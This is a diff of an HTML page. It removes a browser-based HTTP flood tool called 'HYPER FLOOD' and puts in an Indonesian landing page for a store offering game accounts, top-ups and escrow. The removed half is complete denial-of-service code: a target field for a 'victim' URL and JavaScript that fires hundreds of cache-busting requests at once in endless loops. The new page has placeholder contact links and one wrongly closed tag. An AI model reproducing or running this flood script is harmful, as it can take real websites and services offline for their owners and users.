@@ -3,132 +3,85 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TERMINAL | HYPER-FLOOD</title>
+    <title>JB SERVICES | TRUSTED ADMIN</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
     <style>
-        :root { --main-color: #ff003c; --bg-color: #050505; --accent-color: #00f2ff; }
-        body { background: var(--bg-color); color: var(--main-color); font-family: 'Segoe UI', Consolas, monospace; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        
-        /* Cyberpunk Container */
-        .terminal { width: 90%; max-width: 500px; border: 2px solid var(--main-color); background: rgba(0,0,0,0.9); box-shadow: 0 0 20px var(--main-color); position: relative; padding: 20px; }
-        .terminal::before { content: "SYSTEM_ACCESS_GRANTED"; position: absolute; top: -10px; left: 20px; background: var(--main-color); color: #000; font-size: 10px; padding: 2px 10px; font-weight: bold; }
-
-        h1 { text-align: center; text-transform: uppercase; letter-spacing: 5px; margin: 0 0 20px 0; font-size: 24px; text-shadow: 0 0 10px var(--main-color); }
-        
-        .input-group { position: relative; margin-bottom: 20px; }
-        input { width: 100%; background: #111; border: 1px solid #444; color: var(--accent-color); padding: 12px; box-sizing: border-box; outline: none; border-left: 4px solid var(--main-color); }
-
-        /* Stats Grid */
-        .stats-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
-        .stat-card { border: 1px solid #333; padding: 10px; text-align: center; background: #0a0a0a; }
-        .label { font-size: 10px; color: #888; display: block; margin-bottom: 5px; }
-        .value { font-size: 22px; font-weight: bold; color: #fff; }
-
-        /* Action Buttons */
-        .btn-fire { width: 100%; padding: 15px; border: none; font-weight: bold; cursor: pointer; text-transform: uppercase; font-size: 18px; transition: 0.3s; position: relative; overflow: hidden; }
-        .active { background: #fff; color: #000; box-shadow: 0 0 30px #fff; }
-        .idle { background: var(--main-color); color: #fff; }
-        .btn-fire:active { transform: scale(0.98); }
-
-        /* Matrix Log */
-        .log-box { height: 100px; background: #000; border: 1px solid #222; margin-top: 15px; font-size: 10px; color: #00ff41; overflow: hidden; padding: 10px; line-height: 1.5; }
-        
-        .glitch { animation: glitch 0.2s infinite; }
-        @keyframes glitch { 0% { opacity: 1; } 50% { opacity: 0.8; transform: skew(1deg); } 100% { opacity: 1; } }
+        body { background-color: #0f172a; color: white; font-family: 'Inter', sans-serif; }
+        .glass { background: rgba(30, 41, 59, 0.7); backdrop-filter: blur(10px); border: 1px solid rgba(255,255,255,0.1); }
+        .btn-gradient { background: linear-gradient(90deg, #3b82f6, #2563eb); transition: 0.3s; }
+        .btn-gradient:hover { transform: translateY(-3px); box-shadow: 0 10px 20px rgba(37, 99, 235, 0.4); }
     </style>
 </head>
-<body>
+<body class="p-5">
 
-    <div class="terminal">
-        <h1 id="title">HYPER FLOOD</h1>
-        
-        <div class="input-group">
-            <input type="text" id="target" placeholder="HTTP://VICTIM-IP-OR-URL/">
+    <div class="max-w-4xl mx-auto text-center mt-10">
+        <div class="inline-block p-2 px-4 rounded-full bg-blue-500/20 text-blue-400 text-sm font-bold mb-4">
+            <i class="fas fa-check-circle mr-2"></i> VERIFIED ADMIN & REKBER
         </div>
+        <h1 class="text-4xl md:text-5xl font-black mb-4">YANZ <span class="text-blue-500">STORE</span></h1>
+        <p class="text-slate-400 max-w-lg mx-auto">Solusi transaksi aman, cepat, dan terpercaya. Jual Beli Akun, Top Up, dan Rekber Admin.</p>
+    </div>
 
-        <div class="stats-grid">
-            <div class="stat-card">
-                <span class="label">REQUESTS SENT</span>
-                <span class="value" id="count">0</span>
-            </div>
-            <div class="stat-card">
-                <span class="label">THREAD STATUS</span>
-                <span class="value" id="status" style="color: var(--main-color);">IDLE</span>
-            </div>
+    <div class="grid grid-cols-2 md:grid-cols-4 gap-4 max-w-4xl mx-auto mt-10">
+        <div class="glass p-4 rounded-2xl text-center">
+            <div class="text-2xl font-bold">500+</div>
+            <div class="text-xs text-slate-500 uppercase">Testimoni</div>
         </div>
-
-        <button id="fire-btn" class="btn-fire idle" onclick="toggleAttack()">Launch Protocol</button>
-        
-        <div class="log-box" id="log">
-            > STANDBY...<br>
-            > AWAITING TARGET ENTRANCE...
+        <div class="glass p-4 rounded-2xl text-center">
+            <div class="text-2xl font-bold">100%</div>
+            <div class="text-xs text-slate-500 uppercase">Amanah</div>
+        </div>
+        <div class="glass p-4 rounded-2xl text-center">
+            <div class="text-2xl font-bold">Fast</div>
+            <div class="text-xs text-slate-500 uppercase">Respon</div>
+        </div>
+        <div class="glass p-4 rounded-2xl text-center">
+            <div class="text-2xl font-bold">Low</div>
+            <div class="text-xs text-slate-500 uppercase">Fee Rekber</div>
         </div>
     </div>
 
-    <script>
-        let isAttacking = false;
-        let requests = 0;
-        let threads = [];
+    <div class="max-w-4xl mx-auto mt-12">
+        <h2 class="text-xl font-bold mb-6 border-l-4 border-blue-500 pl-3">LAYANAN KAMI</h2>
+        <div class="grid md:grid-cols-3 gap-6">
+            
+            <div class="glass p-6 rounded-3xl relative overflow-hidden group">
+                <i class="fas fa-handshake text-4xl text-blue-500 mb-4"></i>
+                <h3 class="font-bold text-lg">REKBER / BERES</h3>
+                <p class="text-sm text-slate-400 mt-2">Penengah transaksi aman antara pembeli & penjual.</p>
+            </div>
 
-        function toggleAttack() {
-            const url = document.getElementById('target').value;
-            if (!url.startsWith('http')) return alert("PROTOCOL MISSING: Input URL with http/https!");
+            <div class="glass p-6 rounded-3xl relative overflow-hidden group">
+                <i class="fas fa-shopping-cart text-4xl text-green-500 mb-4"></i>
+                <h3 class="font-bold text-lg">JUAL BELI AKUN</h3>
+                <p class="text-sm text-slate-400 mt-2">Sedia stok akun ML, FF, PUBGM kualitas Sultan harga bersahabat.</p>
+            </div>
 
-            isAttacking = !isAttacking;
-            const btn = document.getElementById('fire-btn');
-            const status = document.getElementById('status');
-            const title = document.getElementById('title');
+            <div class="glass p-6 rounded-3xl relative overflow-hidden group">
+                <i class="fas fa-bolt text-4xl text-yellow-500 mb-4"></i>
+                <h3 class="font-bold text-lg">TOP UP GAME</h3>
+                <p class="text-sm text-slate-400 mt-2">Top up Diamond & UC legal 100% aman anti minus.</p>
+            </div>
 
-            if (isAttacking) {
-                btn.innerHTML = "ABORT MISSION";
-                btn.className = "btn-fire active";
-                status.innerHTML = "ACTIVE";
-                status.style.color = "#00ff41";
-                title.classList.add('glitch');
-                addLog("!! ATTACK VECTOR ENGAGED !!");
-                startAttack(url);
-            } else {
-                location.reload(); // Hard stop
-            }
-        }
+        </div>
+    </div>
 
-        async function startAttack(url) {
-            // Hexa-Thread: Membuka 6 jalur async sekaligus
-            for (let i = 0; i < 6; i++) {
-                burst(url);
-            }
-        }
+    <div class="max-w-4xl mx-auto mt-16 mb-20 text-center">
+        <h2 class="text-2xl font-bold mb-6">Siap Melakukan Transaksi?</h2>
+        <div class="flex flex-col md:flex-row justify-center gap-4">
+            <a href="https://wa.me/6281234567890" class="btn-gradient px-8 py-4 rounded-2xl font-bold flex items-center justify-center">
+                <i class="fab fa-whatsapp mr-2 text-xl"></i> CHAT WHATSAPP
+            </div>
+            <a href="https://t.me/ID_TELEGRAM_LO" class="bg-slate-700 hover:bg-slate-600 px-8 py-4 rounded-2xl font-bold flex items-center justify-center transition">
+                <i class="fab fa-telegram-plane mr-2 text-xl"></i> HUBUNGI TELEGRAM
+            </a>
+        </div>
+    </div>
 
-        async function burst(url) {
-            while (isAttacking) {
-                const cluster = [];
-                // 100 request per cluster thread
-                for (let i = 0; i < 100; i++) {
-                    cluster.push(fire(url));
-                }
-                await Promise.allSettled(cluster);
-            }
-        }
+    <footer class="text-center text-slate-600 text-sm py-10 border-t border-slate-800">
+        &copy; 2026 YANZ STORE. All Rights Reserved.
+    </footer>
 
-        async function fire(url) {
-            const bypassUrl = url + (url.includes('?') ? '&' : '?') + "burst=" + Math.random();
-            try {
-                await fetch(bypassUrl, { mode: 'no-cors', cache: 'no-store' });
-            } catch (e) {}
-            requests++;
-            updateUI();
-        }
-
-        function updateUI() {
-            document.getElementById('count').innerText = requests.toLocaleString();
-            if (requests % 500 === 0) {
-                addLog(`[+] EXECUTING BURST: ${requests} PACKETS`);
-            }
-        }
-
-        function addLog(msg) {
-            const lb = document.getElementById('log');
-            lb.innerHTML = `> ${msg}<br>` + lb.innerHTML;
-        }
-    </script>
 </body>
 </html>
